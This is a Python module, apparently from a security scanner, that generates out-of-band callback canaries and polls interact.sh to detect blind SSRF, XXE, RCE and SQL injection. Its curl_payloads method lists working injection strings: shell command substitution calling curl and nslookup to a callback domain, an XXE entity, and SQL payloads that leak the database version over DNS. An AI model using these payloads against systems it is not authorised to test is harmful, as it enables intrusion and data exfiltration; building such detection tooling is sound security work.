"""
BEATRIX OOB Detector

Ported from Sweet Scanner's Collaborator architecture.

Provides out-of-band (OOB) callback detection for blind vulnerabilities:
- Blind SSRF
- Blind XXE
- Blind RCE (via DNS/HTTP callbacks)
- Blind SQLi (via DNS exfil)

Supports multiple OOB services:
- Sweet Scanner Collaborator (if available)
- interact.sh (open source)
- Custom webhook/DNS endpoints
- dnslog.cn
"""

import asyncio
import secrets
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any, Awaitable, Callable, Dict, List, Optional


class InteractionType(Enum):
    """Type of OOB interaction detected."""
    DNS = auto()
    HTTP = auto()
    SMTP = auto()
    FTP = auto()


class OOBProvider(Enum):
    """Supported OOB callback providers."""
    INTERACTSH = auto()
    WEBHOOK_SITE = auto()
    CUSTOM = auto()


@dataclass
class OOBPayload:
    """A generated OOB payload with its tracking ID."""
    id: str                              # Unique correlation ID
    domain: str                          # Full callback domain
    url: str                             # Full callback URL (http://)
    dns_payload: str                     # DNS-only payload (subdomain)
    created_at: datetime = field(default_factory=datetime.now)
    context: Dict[str, Any] = field(default_factory=dict)

    # What vulnerability we're testing
    vuln_type: str = ""                  # ssrf, xxe, rce, sqli
    target_url: str = ""                 # URL being tested
    parameter: str = ""                  # Parameter being tested

    @property
    def dns_canary(self) -> str:
        """Payload for DNS-only exfil (e.g., in SQLi)."""
        return self.dns_payload

    @property
    def http_canary(self) -> str:
        """Full HTTP URL for SSRF/XXE testing."""
        return self.url

    def curl_payloads(self) -> List[str]:
        """Generate common injection payloads using this canary."""
        return [
            # SSRF
            self.url,
            f"http://{self.domain}/",
            f"https://{self.domain}/",
            # XXE
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{self.domain}/">]>',
            # RCE via curl
            f"$(curl {self.url})",
            f"`curl {self.url}`",
            f"| curl {self.url}",
            # RCE via nslookup
            f"$(nslookup {self.domain})",
            f"`nslookup {self.domain}`",
            # DNS exfil for blind SQLi
            f"'; EXEC master..xp_dirtree '//{self.domain}/a' --",
            f"' UNION SELECT LOAD_FILE(CONCAT('//',(SELECT version()),'.{self.domain}/a'))-- -",
        ]


@dataclass
class OOBInteraction:
    """A detected out-of-band interaction."""
    payload_id: str
    type: InteractionType
    timestamp: datetime
    client_ip: str = ""
    raw_data: Dict[str, Any] = field(default_factory=dict)

    # Correlated context from the original payload
    vuln_type: str = ""
    target_url: str = ""
    parameter: str = ""


class OOBDetector:
    """
    Out-of-band callback manager.

    Usage:
        detector = OOBDetector(provider_domain="your.interact.sh")

        # Generate a payload for testing
        payload = detector.create_payload(
            vuln_type="ssrf",
            target_url="https://target.com/api",
            parameter="url",
        )

        # Use payload.http_canary or payload.dns_canary in your test
        # ... send the request ...

        # Later, poll for interactions
        interactions = await detector.poll()
        for hit in interactions:
            print(f"OOB hit! {hit.type} from {hit.client_ip}")
    """

    def __init__(
        self,
        provider_domain: str = "",
        provider: OOBProvider = OOBProvider.INTERACTSH,
        poll_callback: Optional[Callable[[], Awaitable[List[Dict]]]] = None,
    ):
        self._provider_domain = provider_domain
        self._provider = provider
        self._poll_callback = poll_callback

        self._payloads: Dict[str, OOBPayload] = {}  # id -> payload
        self._interactions: List[OOBInteraction] = []
        self._token = secrets.token_hex(4)

    def create_payload(
        self,
        vuln_type: str = "",
        target_url: str = "",
        parameter: str = "",
        context: Optional[Dict[str, Any]] = None,
    ) -> OOBPayload:
        """
        Generate a unique OOB payload for correlation.

        Each payload gets a unique subdomain so we can correlate
        callbacks to specific test cases.
        """
        uid = secrets.token_hex(6)

        if self._provider_domain:
            domain = f"{uid}.{self._provider_domain}"
            url = f"http://{domain}/"
            dns_payload = domain
        else:
            # Fallback: generate tracking IDs without a real provider
            domain = f"{uid}.oob.invalid"
            url = f"http://{domain}/"
            dns_payload = domain

        payload = OOBPayload(
            id=uid,
            domain=domain,
            url=url,
            dns_payload=dns_payload,
            vuln_type=vuln_type,
            target_url=target_url,
            parameter=parameter,
            context=context or {},
        )

        self._payloads[uid] = payload
        return payload

    async def poll(self, timeout: float = 5.0) -> List[OOBInteraction]:
        """
        Poll for new OOB interactions.

        Returns list of interactions matched to known payloads.
        """
        if not self._poll_callback:
            return []

        try:
            raw_interactions = await asyncio.wait_for(
                self._poll_callback(), timeout=timeout
            )
        except asyncio.TimeoutError:
            return []

        new_hits: List[OOBInteraction] = []

        for raw in raw_interactions:
            # Try to correlate to a known payload
            subdomain = raw.get("subdomain", "")
            uid = self._extract_uid(subdomain)

            if uid and uid in self._payloads:
                payload = self._payloads[uid]
                interaction = OOBInteraction(
                    payload_id=uid,
                    type=self._parse_type(raw.get("type", "dns")),
                    timestamp=datetime.now(),
                    client_ip=raw.get("client_ip", ""),
                    raw_data=raw,
                    vuln_type=payload.vuln_type,
                    target_url=payload.target_url,
                    parameter=payload.parameter,
                )
                new_hits.append(interaction)
                self._interactions.append(interaction)

        return new_hits

    def check_payload(self, payload_id: str) -> List[OOBInteraction]:
        """Check if a specific payload received any callbacks."""
        return [i for i in self._interactions if i.payload_id == payload_id]

    def _extract_uid(self, subdomain: str) -> Optional[str]:
        """Extract our tracking UID from a subdomain."""
        parts = subdomain.split(".")
        for part in parts:
            if part in self._payloads:
                return part
        return None

    def _parse_type(self, type_str: str) -> InteractionType:
        """Parse interaction type from string."""
        type_map = {
            "dns": InteractionType.DNS,
            "http": InteractionType.HTTP,
            "smtp": InteractionType.SMTP,
            "ftp": InteractionType.FTP,
        }
        return type_map.get(type_str.lower(), InteractionType.DNS)

    @property
    def active_payloads(self) -> int:
        return len(self._payloads)

    @property
    def total_interactions(self) -> int:
        return len(self._interactions)

    def clear(self):
        """Reset all payloads and interactions."""
        self._payloads.clear()
        self._interactions.clear()


# =============================================================================
# INTERACTSH CLIENT (lightweight)
# =============================================================================

class InteractshClient:
    """
    Minimal interact.sh client for OOB detection.

    Usage:
        async with InteractshClient() as client:
            payload = client.create_payload(vuln_type="ssrf")
            # ... use payload.http_canary ...
            await asyncio.sleep(5)
            hits = await client.poll()
    """

    DEFAULT_SERVER = "oast.pro"

    def __init__(self, server: Optional[str] = None):
        self._server = server or self.DEFAULT_SERVER
        self._session_id: Optional[str] = None
        self._detector: Optional[OOBDetector] = None
        self._client = None

    async def __aenter__(self):
        import httpx
        self._client = httpx.AsyncClient(timeout=10, verify=False)

        # Register with interact.sh server
        self._session_id = secrets.token_hex(16)
        self._detector = OOBDetector(
            provider_domain=f"{self._session_id}.{self._server}",
            provider=OOBProvider.INTERACTSH,
            poll_callback=self._poll_interactsh,
        )
        return self

    async def __aexit__(self, *args):
        if self._client:
            await self._client.aclose()

    @property
    def detector(self) -> Optional["OOBDetector"]:
        """Public access to the OOB detector instance."""
        return self._detector

    @property
    def session_id(self) -> Optional[str]:
        """Public access to the session identifier."""
        return self._session_id

    @property
    def server(self) -> str:
        """Public access to the interact.sh server domain."""
        return self._server

    @property
    def oob_domain(self) -> str:
        """Full OOB canary domain (session_id.server)."""
        if self._session_id:
            return f"{self._session_id}.{self._server}"
        return self._server

    def create_payload(self, **kwargs) -> OOBPayload:
        """Create an OOB payload."""
        if not self._detector:
            raise RuntimeError("Not initialized. Use 'async with'.")
        return self._detector.create_payload(**kwargs)

    async def poll(self, timeout: float = 5.0) -> List[OOBInteraction]:
        """Poll for interactions."""
        if not self._detector:
            return []
        return await self._detector.poll(timeout=timeout)

    async def _poll_interactsh(self) -> List[Dict]:
        """Poll the interact.sh API for callbacks."""
        if not self._client or not self._session_id:
            return []

        try:
            resp = await self._client.get(
                f"https://{self._server}/poll",
                params={"id": self._session_id},
            )
            if resp.status_code == 200:
                data = resp.json()
                return data.get("data", []) or []
        except Exception:
            pass
        return []
